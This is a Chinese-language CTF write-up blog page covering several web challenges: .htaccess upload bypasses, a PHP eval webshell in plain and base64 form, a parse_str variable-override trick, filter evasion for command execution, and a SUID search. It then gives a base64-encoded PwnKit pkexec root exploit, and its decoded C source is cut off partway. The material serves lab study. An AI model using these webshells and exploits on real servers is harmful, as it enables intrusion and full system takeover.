@@ -1,0 +1,1401 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>Polar困难 - Yu9991n9的博客</title>
+
+  
+    <meta name="description" content="上传(.htaccess)进来之后是一个很普通的文件上传的页面：  直接传php文件是不行的，然后就是想着拿.htaccess传上去之后强制把jpg文件当做php解析，但是正常走了之后发现还是不行的，就在考虑是不是&lt;?给过滤了 那这里我们就直接穿一个base64编码的一句话木马，然后再传.hta文件把它解码了之后执行   然后我直接去访问然后传参就可以了  这里再详细的讲一下关于hta文件在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Polar困难">
+<meta property="og:url" content="https://yu9991n9.github.io/2026/03/26/polar%E5%9B%B0%E9%9A%BE/">
+<meta property="og:site_name" content="Yu9991n9的博客">
+<meta property="og:description" content="上传(.htaccess)进来之后是一个很普通的文件上传的页面：  直接传php文件是不行的，然后就是想着拿.htaccess传上去之后强制把jpg文件当做php解析，但是正常走了之后发现还是不行的，就在考虑是不是&lt;?给过滤了 那这里我们就直接穿一个base64编码的一句话木马，然后再传.hta文件把它解码了之后执行   然后我直接去访问然后传参就可以了  这里再详细的讲一下关于hta文件在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2026-03-26T08:25:00.000Z">
+<meta property="article:modified_time" content="2026-08-20T17:10:29.011Z">
+<meta property="article:author" content="Yu9991n9">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-03-26T16:25:00+08:00","dateModified":"2026-08-21T01:10:29+08:00","datePublished":"2026-03-26T16:25:00+08:00","description":"","headline":"Polar困难","mainEntityOfPage":{"@type":"WebPage","@id":"https://yu9991n9.github.io/2026/03/26/polar%E5%9B%B0%E9%9A%BE/"},"publisher":{"@type":"Organization","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://yu9991n9.github.io/2026/03/26/polar%E5%9B%B0%E9%9A%BE/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/26/polar%E5%9B%B0%E9%9A%BE/"><span class="title">Polar困难</span></a><a class="item title" href="/2026/01/25/polar%E4%B8%AD%E7%AD%89/"><span class="title">Polar中等</span></a><a class="item title" href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/"><span class="title">各版本绕过_wakeup()</span></a><a class="item title" href="/2026/03/08/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">session 文件包含</span></a><a class="item title" href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"><span class="title">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a><a class="item title" href="/2026/03/02/hello-world/"><span class="title">Hello World</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-03-26T08:25:00.000Z">2026-03-26</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-08-20T17:10:29.011Z">2026-08-21</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Polar困难</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传(.htaccess)"></a>上传(.htaccess)</h1><p>进来之后是一个很普通的文件上传的页面：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326162508958.png" alt="image-20260326162508958"></p>
+<p>直接传php文件是不行的，然后就是想着拿.htaccess传上去之后强制把jpg文件当做php解析，但是正常走了之后发现还是不行的，就在考虑是不是&lt;?给过滤了</p>
+<p>那这里我们就直接穿一个base64编码的一句话木马，然后再传.hta文件把它解码了之后执行</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326163537833.png" alt="image-20260326163537833"></p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326163800441.png" alt="image-20260326163800441"></p>
+<p>然后我直接去访问然后传参就可以了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326163823259.png" alt="image-20260326163823259"></p>
+<p>这里再详细的讲一下关于hta文件在不同情况下应该写些什么</p>
+<p>先来看我们这道题的hta：<br>首先我们内容的前两行其实就是在伪造文件头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>原理（伪造图片头部）</strong>：很多靶场在文件上传时，会用 PHP 的 <code>exif_imagetype()</code> 或 <code>getimagesize()</code> 函数去检查文件内容。如果它发现文件开头不是图片的格式，就会报错“这不是图片”。</li>
+<li><strong>妙招</strong>：在 C 语言和 XBM（一种古老的黑白图像格式）中，图片尺寸就是用 <code>#define width</code> 这种语法定义的。并且，在 Apache 的配置文件里，以 <code>#</code> 开头的行会被当成<strong>注释</strong>忽略掉！</li>
+<li><strong>效果</strong>：PHP 引擎一看：“哦，有 <code>#define width</code>，这是个 XBM 图片，放行！”；Apache 服务器一看：“哦，这是两行注释，不用管，直接执行下面的配置！”<strong>完美骗过双端！</strong></li>
+</ul>
+<p>然后往下就是用了一个关键字绕过加上换一个解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;php://filter/convert.base64-decode/resource=./shell.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>原理（关键字绕过 + 文件包含解码）</strong>：</p>
+<ul>
+<li>这里本来应该是 <code>php_value auto_prepend_file</code>。这个指令的意思是：“在执行任何 PHP 文件之前，先强行把我指定的文件包含进来执行”。</li>
+<li><strong>为什么加反斜杠 <code>\</code>？** 因为靶场的 WAF 过滤了 <code>auto_prepend_file</code> 这个敏感词！在 Apache 里，反斜杠 <code>\</code> 代表</strong>“换行拼接”**。所以咱们把它拆成两半，成功绕过 WAF 检测，而 Apache 在解析时又会把它拼回原样。</li>
+<li><strong>后面的 <code>php://filter...</code></strong>：这是告诉 PHP：“包含 <code>shell.jpg</code> 之前，先用 Base64 给它解码！”（这就解释了为什么你之前传 UTF-16 乱码会失败，因为它在等 Base64！）。</li>
+</ul>
+<p>然后就是最基础的htaccess文件的语句：</p>
+<p>AddType application&#x2F;x-httpd-php .jpg就是把.jpg文件当做php文件来解析</p>
+<p>那么放在其他场景里面来看一下应该写些什么</p>
+<p>如果一道题只是限制了不允许上传php后缀文件那么我们传的hta文件里面只需要写一句就可以了</p>
+<ul>
+<li><p><strong>写法</strong>：</p>
+<p>Apache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p><em>(或者用另一种写法：<code>SetHandler application/x-httpd-php</code>)</em></p>
+</li>
+<li><p><strong>怎么打</strong>：传这个 <code>.htaccess</code>，然后直接传一个里面写着 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code> 的 <code>shell.jpg</code> 即可。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>情况二：靶场检查了文件内容是不是图片（检查了头部）</p>
+<ul>
+<li><p><strong>场景</strong>：限制了后缀名，并且后端用了 <code>getimagesize()</code> 检查文件开头是不是真实图片。</p>
+</li>
+<li><p><strong>写法</strong>（利用 XBM 伪造）：</p>
+<p>Apache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 133</span><br><span class="line">#define height 133</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>怎么打</strong>：传这个 <code>.htaccess</code>，然后把木马也伪装一下，比如在你的 <code>shell.jpg</code> 最前面加一行 <code>GIF89a</code>，然后再写 <code>&lt;?php ... ?&gt;</code>。</p>
+</li>
+</ul>
+<p>情况三：靶场过滤了 <code>.htaccess</code> 里的敏感关键字</p>
+<ul>
+<li><p><strong>场景</strong>：你想用 <code>AddType</code> 或者 <code>php_value</code>，但是传上去提示“包含非法字符”。</p>
+</li>
+<li><p><strong>写法</strong>（利用反斜杠 <code>\</code> 换行绕过）：</p>
+<p>Apache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddT\</span><br><span class="line">ype application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p><em>(注意：<code>\</code> 后面必须紧接着回车换行，不能有空格)</em></p>
+</li>
+</ul>
+<p>情况四：靶场极其变态，不仅过滤 <code>.htaccess</code> 关键字，还过滤了木马里的 <code>&lt;?php</code>（也就是你现在这道题）</p>
+<ul>
+<li><p><strong>场景</strong>：双重 WAF，限制后缀，检查文件头，还把 <code>&lt;?</code> 这个符号拉黑了。</p>
+</li>
+<li><p><strong>写法</strong>（终极 Base64 自动包含流）：</p>
+<p>Apache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;php://filter/convert.base64-decode/resource=./shell.jpg&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>传这个 <code>.htaccess</code>。然后你的 <code>shell.jpg</code> 里<strong>不要写任何明文的 <code>&lt;?php</code></strong>，直接把木马进行 Base64 编码（比如 <code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=</code>），当成内容传上去。Apache 在解析 <code>.jpg</code> 时，会先用 Base64 解码你的木马，完美避开所有对 <code>&lt;?php</code> 的检测！</p>
+</li>
+</ul>
+<h1 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h1><p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326172405518.png" alt="image-20260326172405518"></p>
+<p>先来进行代码审计，这里不准给flag1，flag2去通过post和get方法直接去传参，但是这里又要求flag1和flag2的值都等于8gen1</p>
+<p>再往下看就是要求504_sys.com的值不是0或者空了，在之后就是正则了之后eval$sys里面的东西了</p>
+<p>PHP 接收到你的 GET 请求 <code>?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1</code> 时，它会自动生成一个全局数组 <code>$_GET</code>。 此时，<code>$_GET</code> 数组内部的结构是这样的：</p>
+<p>PHP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_GET = array(</span><br><span class="line">    &quot;_POST&quot; =&gt; array(</span><br><span class="line">        &quot;flag1&quot; =&gt; &quot;8gen1&quot;,</span><br><span class="line">        &quot;flag2&quot; =&gt; &quot;8gen1&quot;</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>你看，<code>$_GET</code> 数组里只有一个顶级键名，叫做 <code>&quot;_POST&quot;</code>。 防御代码检查的是 <code>isset($_GET[&#39;flag1&#39;])</code>（它问的是：<code>$_GET</code> 里面有没有一个顶级键名叫 <code>flag1</code>？）。 答案显然是没有！<code>flag1</code> 被包裹在 <code>_POST</code> 这个数组里面了。所以，所有的 <code>isset</code> 检查全部返回 <code>false</code>，脚本安全放行。</p>
+<ol start="2">
+<li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 是什么？</li>
+</ol>
+<p>过了检查之后，代码执行了： <code>@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);</code></p>
+<p>我们要先搞懂 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>。 PHP 有时候会帮你把传进来的参数整理成数组（比如上面的 <code>$_GET</code>），但 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 非常野蛮，它<strong>根本不看 PHP 整理好的数组</strong>，而是直接去抓取你浏览器网址栏里 <code>?</code> 后面的<strong>最原始的字符串</strong>。</p>
+<p>所以，在这里，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 的值就是一串纯文本： <code>&quot;_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1&quot;</code></p>
+<ol start="3">
+<li>致命的 <code>parse_str()</code> 函数（变量伪造机）</li>
+</ol>
+<p>现在，这串原始文本被送进了 <code>parse_str()</code>。</p>
+<p><code>parse_str(string $string)</code> 的官方定义是：<strong>把字符串解析成多个变量，并设置到当前作用域中。</strong> 它的工作原理非常机械：它看到字符串里有 <code>A=B</code>，就会在内存里强行生成一个变量 <code>$A</code>，它的值是 <code>B</code>。如果看到 <code>A[C]=B</code>，它就会生成一个数组 <code>$A</code>，里面有个键叫 <code>C</code>，值是 <code>B</code>。</p>
+<p>当它处理我们的字符串 <code>_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1</code> 时，极其恐怖的事情发生了： 它看到了 <code>_POST</code> 这个名字。它不管这个名字是不是 PHP 的系统保留字（比如 <code>$_POST</code> 是用来存 POST 请求数据的超全局变量），它直接在内存里<strong>强行重写</strong>了 <code>$_POST</code> 这个变量！</p>
+<p>经过这一步，原本为空的 <code>$_POST</code> 数组，硬生生被它改写成了这样：</p>
+<p>PHP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_POST = array(</span><br><span class="line">    &quot;flag1&quot; =&gt; &quot;8gen1&quot;,</span><br><span class="line">    &quot;flag2&quot; =&gt; &quot;8gen1&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><em>(注意：我们明明发的是 GET 请求，但通过 <code>parse_str</code> 的漏洞，我们成功伪造出了一个包含我们需要的数据的 POST 数组！)</em></p>
+<ol start="4">
+<li><code>extract()</code> 函数（拆包解压）</li>
+</ol>
+<p>最后一步，代码执行了： <code>extract($_POST);</code></p>
+<p><code>extract(array $array)</code> 的官方定义是：<strong>从数组中将变量导入到当前的符号表。</strong> 大白话就是：它会把数组里的“键名”直接变成“变量名”，把“键值”变成“变量值”。</p>
+<p>因为我们在上一步已经把 <code>$_POST</code> 伪造成了包含 <code>flag1</code> 和 <code>flag2</code> 的数组，所以当 <code>extract</code> 处理它时：</p>
+<ul>
+<li>它看到数组里有个键叫 <code>&quot;flag1&quot;</code>，值是 <code>&quot;8gen1&quot;</code>，于是立刻在系统里生成了一行代码：<code>$flag1 = &quot;8gen1&quot;;</code></li>
+<li>它看到数组里有个键叫 <code>&quot;flag2&quot;</code>，值是 <code>&quot;8gen1&quot;</code>，于是又生成了一行：<code>$flag2 = &quot;8gen1&quot;;</code></li>
+</ul>
+<p>到此为止，内存里真真切切地多出了 <code>$flag1</code> 和 <code>$flag2</code> 这两个独立的变量，并且它们的值都是 <code>&#39;8gen1&#39;</code>。</p>
+<p>所以，紧接着的这句判断： <code>if($flag1 == &#39;8gen1&#39; &amp;&amp; $flag2 == &#39;8gen1&#39;)</code></p>
+<p>再然后就是我们要给504_SYS.COm传参了，php的变量只允许数字字母下划线，也就是说只要是检查到不是上述类别的字符就会直接转化为下划线，但是php底层代码有问题，它只会执行一次这样的操作，这里我们504那一串本来前面的位置就需要一个下划线，那这里直接传504[SYS.COM就可以直接把后面的点给保住了</p>
+<h1 id="非常好绕的命令执行"><a href="#非常好绕的命令执行" class="headerlink" title="非常好绕的命令执行"></a>非常好绕的命令执行</h1><p>这道题的$evil &#x3D; $args1.’(‘.$args2.’)(‘.$args3.’)’.’;’;会把我们的三个变量拼接起来并且这里会有两个括号跟在后面，想了一下好像大部分php语法都不支持两个括号，那这里就想到是不是在前面加一个注释符号把后面的过滤掉就可以了</p>
+<p>这里还没过滤反引号，我们直接使用反引号来执行命令加上一个echo回显</p>
+<p>这里还不允许有空格</p>
+<p><code>ctype_space</code>：查你<strong>是不是全是空 &#x2F; 空格</strong></p>
+<p><code>ctype_graph</code>：查你<strong>有没有空格，是不是全紧凑</strong></p>
+<p>我本来拿$IFS去绕过的但是这里$也ban了</p>
+<p>所以我们这里要想办法去绕空格，直接&lt;就可以了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260326181457236.png" alt="image-20260326181457236"></p>
+<h1 id="这又是一个上传（Linux提权）"><a href="#这又是一个上传（Linux提权）" class="headerlink" title="这又是一个上传（Linux提权）"></a>这又是一个上传（Linux提权）</h1><p>首先进入题目就看见一个文件上传的页面</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260402155507973.png" alt="image-20260402155507973"></p>
+<p>直接上传一个php文件：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260402155934873.png" alt="image-20260402155934873"></p>
+<p>那我们尝试上传一个jpg后缀的文件然后抓包修改后缀为php，发现是可行的，这里我穿了一个最基础的一句话木马</p>
+<p>我们虽然可以直接蚁剑连接，但是我们是没有办法直接打开·文件进行的，也就是说我们这里权限不满足我们这样操作</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260402161057025.png" alt="image-20260402161057025"></p>
+<p>这里不行之后我又尝试了直接一步一步文件进行命令执行，然后看见根目录下面就直接有一个flag，尝试cat它以及使用了一些其他替代的命令发现这里也是不行的</p>
+<p>这道题需要运用的就是一个Linux提权的漏洞了</p>
+<p>首先我们进来发现我们是www-data用户，这是一个权限比较低的用户，再想到我们之前不能打开文件，那我们这里更要想办法提权了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>我们这里直接就可以看见pkexec</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260402162417959.png" alt="image-20260402162417959"></p>
+<p>详细的讲解就不在这里赘述了，下面先来介绍第一种方法：</p>
+<p>我们打开蚁剑的连接到shell的终端</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKY2hhciAqc2hlbGwgPQogICAgIiNpbmNsdWRlIDxzdGRpby5oPlxuIgogICAgIiNpbmNsdWRlIDxzdGRsaWIuaD5cbiIKICAgICIjaW5jbHVkZSA8dW5pc3RkLmg+XG5cbiIKICAgICJ2b2lkIGdjb252KCkge31cbiIKICAgICJ2b2lkIGdjb252X2luaXQoKSB7XG4iCiAgICAiICAgICAgIHNldHVpZCgwKTsgc2V0Z2lkKDApO1xuIgogICAgIiAgICAgICBzZXRldWlkKDApOyBzZXRlZ2lkKDApO1xuIgogICAgIiAgICAgICBGSUxFICppbiA9IGZvcGVuKFwiL2ZsYWdcIiwgXCJyXCIpO1xuIgogICAgIiAgICAgICBpZiAoIWluKSBleGl0KDEpO1xuIgogICAgIiAgICAgICBGSUxFICpvdXQgPSBmb3BlbihcIi90bXAvZmxhZ19zdWNjZXNzLnR4dFwiLCBcIndcIik7XG4iCiAgICAiICAgICAgIGlmICghb3V0KSBleGl0KDEpO1xuIgogICAgIiAgICAgICBjaGFyIGJ1ZlsxMDI0XTtcbiIKICAgICIgICAgICAgc2l6ZV90IG47XG4iCiAgICAiICAgICAgIHdoaWxlICgobiA9IGZyZWFkKGJ1ZiwgMSwgc2l6ZW9mKGJ1ZiksIGluKSkgPiAwKSB7XG4iCiAgICAiICAgICAgICAgICBmd3JpdGUoYnVmLCAxLCBuLCBvdXQpO1xuIgogICAgIiAgICAgICB9XG4iCiAgICAiICAgICAgIGZjbG9zZShpbik7IGZjbG9zZShvdXQpO1xuIgogICAgIiAgICAgICBjaG1vZChcIi90bXAvZmxhZ19zdWNjZXNzLnR4dFwiLCAwNzc3KTtcbiIKICAgICIgICAgICAgZXhpdCgwKTtcbiIKICAgICJ9IjsKICAgIAppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CiAgICBGSUxFICpmcDsKICAgIHN5c3RlbSgibWtkaXIgLXAgJ0dDT05WX1BBVEg9Lic7IHRvdWNoICdHQ09OVl9QQVRIPS4vcHdua2l0JzsgY2htb2QgYSt4ICdHQ09OVl9QQVRIPS4vcHdua2l0JyIpOwogICAgc3lzdGVtKCJta2RpciAtcCBwd25raXQ7IGVjaG8gJ21vZHVsZSBVVEYtOC8vIFBXTktJVC8vIHB3bmtpdCAyJyA+IHB3bmtpdC9nY29udi1tb2R1bGVzIik7CiAgICBmcCA9IGZvcGVuKCJwd25raXQvcHdua2l0LmMiLCAidyIpOwogICAgZnByaW50ZihmcCwgIiVzIiwgc2hlbGwpOwogICAgZmNsb3NlKGZwKTsgCiAgICBzeXN0ZW0oImdjYyBwd25raXQvcHdua2l0LmMgLW8gcHdua2l0L3B3bmtpdC5zbyAtc2hhcmVkIC1mUElDIik7CiAgICBjaGFyICplbnZbXSA9IHsgInB3bmtpdCIsICJQQVRIPUdDT05WX1BBVEg9LiIsICJDSEFSU0VUPVBXTktJVCIsICJTSEVMTD1wd25raXQiLCBOVUxMIH07CiAgICBleGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIChjaGFyKltdKXtOVUxMfSwgZW52KTsKICAgIHJldHVybiAwOwp9&quot; | base64 -d &gt; /tmp/exp2.c</span><br></pre></td></tr></table></figure>
+
+<p>再来对该断payload进行讲解：<br>这段payload的整体架构就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;一长串字符&quot; | base64 -d &gt; /tmp/exp2.c</span><br></pre></td></tr></table></figure>
+
+<p><strong>1️⃣ <code>echo &quot;...&quot;</code> （打包发货）</strong></p>
+<ul>
+<li><strong>作用：</strong> <code>echo</code> 命令的作用是在终端里打印一段文本。这里它把那一长串看似乱码的 Base64 字符串当作文本输出了出来。</li>
+</ul>
+<p><strong>2️⃣ <code>|</code> （管道符：传送带）</strong></p>
+<ul>
+<li><strong>作用：</strong> 这是 Linux 里极其伟大的发明。它像一条传送带，把左边 <code>echo</code> 吐出来的那一长串字符串，直接“喂”给右边的命令，而不是显示在屏幕上。</li>
+</ul>
+<p><strong>3️⃣ <code>base64 -d</code> （核心解码器）</strong></p>
+<ul>
+<li><strong>作用：</strong> <code>base64</code> 是 Linux 系统自带的编解码工具。后面的 <code>-d</code> 参数是 <code>decode</code>（解码）的缩写。</li>
+<li>它接收了管道传过来的那一长串代码，瞬间把它还原成了咱们上一回合讲的那段<strong>真正的 C 语言源码</strong>。</li>
+</ul>
+<p><strong>4️⃣ <code>&gt; /tmp/exp2.c</code> （落地写盘）</strong></p>
+<ul>
+<li><strong>作用：</strong> <code>&gt;</code> 是重定向符号，意思是“把前面解码出来的 C 语言代码，不要打印在屏幕上，而是写进一个文件里”。</li>
+<li><strong>为什么选 <code>/tmp</code> 目录？（实战重点）：</strong> 在 Linux 系统中，你当前的身份是极其卑微的 <code>www-data</code>，你在这个系统的绝大多数地方都没有写文件的权限。但是，<strong><code>/tmp</code>（临时文件夹）是 Linux 里唯一一个默认允许所有人（任何人）读写的地方</strong>。所以这里是存放咱们黑客武器的完美阵地！</li>
+</ul>
+<p>也就是我们把解码后的内容直接写入了&#x2F;tmp&#x2F;exp2.c这个文件</p>
+<p>理解了大致框架之后就来看这段经过base64编码的内容：</p>
+<p>蚁剑的终端是非交互式的终端，所以我们这里直接拿fopen等命令强制执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/* --- 【上半部分：这是&quot;毒药&quot;的配方，存放在一个长字符串里】 --- */</span><br><span class="line">char *shell =</span><br><span class="line">    &quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">    &quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">    &quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">    &quot;       setuid(0); setgid(0);\n&quot;           // 确保获取 Root 权限</span><br><span class="line">    &quot;       seteuid(0); 